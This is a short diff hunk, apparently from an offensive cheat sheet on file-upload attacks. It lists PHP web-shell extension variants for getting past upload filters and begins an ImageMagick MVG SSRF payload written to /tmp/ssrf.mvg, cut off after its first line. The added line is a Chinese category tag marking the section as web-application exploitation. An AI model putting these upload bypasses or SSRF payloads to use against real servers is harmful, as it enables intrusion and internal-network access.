@@ -58,6 +58,7 @@ filename=shell.phtml, shell.pHp, shell.php5   → extension variants
 ### ImageMagick SSRF / File Read (ImageTragick family + modern variants)
 ```bash
 # Upload this as a .mvg or rename to .jpg/.png (magic bytes bypass)
+- 攻击大类:C09 Web应用漏洞利用
 # MVG SSRF payload — fetches internal URL during processing
 cat > /tmp/ssrf.mvg << 'EOF'
 push graphic-context
